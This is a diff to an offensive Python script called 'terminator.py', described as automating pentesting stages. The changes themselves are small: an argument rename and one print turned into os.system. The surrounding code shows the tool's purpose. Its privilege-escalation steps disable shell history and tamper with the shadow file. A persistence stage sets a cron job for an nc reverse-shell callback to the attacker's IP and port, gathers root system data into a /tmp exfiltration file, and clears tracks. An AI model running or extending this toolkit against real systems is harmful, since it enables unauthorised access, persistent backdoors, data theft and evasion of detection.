@@ -27,7 +27,7 @@ import re
 
 # set command line flags and corresponding global variables
 parser = argparse.ArgumentParser(description="script for automating common pentesting procedures <>run four times (1st on your machine, 2nd and 3rd on target machine, and 4th on your machine)\n(stage 1-enumerating target from local machine): python3 terminator.py enum -t <target_ip_to_enumerate> (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))\n(stage 2-privilege escalation after gaining shell on target machine): python3 terminator.py priv\n(stage 3-persistence/data exfiltration after gaining root privileges on target machine): python3 terminator.py root -u <new_user_name> -p <new_user_passwd> -l <local_ip> -x <local_listening_port> (optional: -f (bypass root permissions check))\n(stage 4-create report on local machine): python3 terminator.py report -o <output_file_name>")
-parser.add_argument("level", help="use terminator to enumerate target machine from local machine")
+parser.add_argument("module", help="specify which module to use (enum/priv/root/report)")
 parser.add_argument("-t", "--targetip", help="(enum) specify target ip to enumerate")
 parser.add_argument("-w", "--wordlist", help="(enum) specify wordlist for directory walking (gobuster)")
 parser.add_argument("-u", "--username", help="(priv/root) specify the username you want for the new user")
@@ -37,7 +37,7 @@ parser.add_argument("-x", "--localport", help="(root) specify your (local) port 
 parser.add_argument("-f", "--force", help="(root) force bypass of root permissions check (optional)", required=False, action="store_true")
 parser.add_argument("-o", "--output", help="(report) specify name for report")
 args = parser.parse_args()
-level = args.level
+module = args.module
 ip = args.targetip
 wordlist = args.wordlist
 username = args.username
@@ -539,7 +539,7 @@ def extract(username,password,local_ip,local_port):
    os.system("echo 'cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}' >> /tmp/data_exfil.txt".format(local_ip,local_port))
 
    # get system info and write to data file
-   print("echo '' >> /tmp/data_exfil.txt")
+   os.system("echo '' >> /tmp/data_exfil.txt")
    os.system("echo '### the following data was extracted as root user ###' >> /tmp/data_exfil.txt")
    os.system("echo 'id:' >> /tmp/data_exfil.txt")
    os.system("id | tee -a /tmp/data_exfil.txt")
@@ -734,7 +734,7 @@ def doc_make(output):
 
 
 # call functions
-if level == "enum":
+if module == "enum":
    # call enumeration functions
    init_scan(ip)
    for item in tot:
@@ -752,7 +752,7 @@ if level == "enum":
       else:
         print("\n### scan complete... view /terminator/ and continue with manual enumeration ###")
    os.system("echo '### end of enumeration results ###' >> /terminator/enum.txt")
-elif level == "priv":
+elif module == "priv":
    # call privilege escalation functions
    disable_hist()
    sudo_l()
@@ -760,7 +760,7 @@ elif level == "priv":
    path()
    pass_shadow(username,password)
    root_check()
-elif level == "root":
+elif module == "root":
    # call persistence and data exfil functions
    is_root = perm_check()
    # check for root permissions
@@ -771,7 +771,7 @@ elif level == "root":
       cron_make()
       extract(username,password,local_ip,local_port)
       clear_tracks()
-elif level == "report":
+elif module == "report":
    # call report functions
    report(output)
    lib = lib_check()
